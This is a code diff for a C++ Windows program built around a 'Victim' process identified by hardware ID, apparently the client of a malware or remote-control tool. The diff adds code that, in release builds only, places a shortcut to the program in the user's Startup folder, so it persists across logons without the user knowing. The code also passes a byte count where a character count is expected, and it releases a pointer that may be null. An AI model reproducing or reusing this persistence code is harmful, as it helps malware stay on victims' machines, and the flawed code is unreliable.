@@ -1,6 +1,7 @@
 #include "victim.hpp"
 #include <comdef.h>
 #include <Wbemidl.h>
+#include <shlobj_core.h>
 #include <iostream>
 
 #pragma comment(lib, "wbemuuid.lib")
@@ -118,7 +119,35 @@ static std::string getHardwareId() {
 int main() {
     Victim victim(getHardwareId());
 
-    //TODO: add app to startup
+#ifdef NDEBUG
+    wchar_t buf[256];
+    GetModuleFileNameW(NULL, buf, sizeof(buf));
+    std::wstring path(buf);
+    std::wstring exeName = path.substr(path.find_last_of('\\') + 1);
+
+    //add app to autostart
+    PWSTR start;
+    if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_Startup, 0, NULL, &start))) {
+        std::wstring lnkPath = std::wstring(start) + L"\\" + exeName + L".lnk";
+        //free the allocated memory
+        CoTaskMemFree(start);
+
+        //create the link
+        if (SUCCEEDED(CoInitialize(NULL))) {
+            IShellLinkW* pShellLink = NULL;
+            if (SUCCEEDED(CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_ALL, IID_IShellLink, (void**)&pShellLink))) {
+                pShellLink->SetPath(path.c_str());
+                pShellLink->SetIconLocation(path.c_str(), 0);
+                IPersistFile* pPersistFile;
+                pShellLink->QueryInterface(IID_IPersistFile, (void**)&pPersistFile);
+                pPersistFile->Save(lnkPath.c_str(), TRUE);
+                pPersistFile->Release();
+            }
+            pShellLink->Release();
+        }
+        CoUninitialize();
+    }
+#endif
 
     return victim.runVictimProcess();
 }
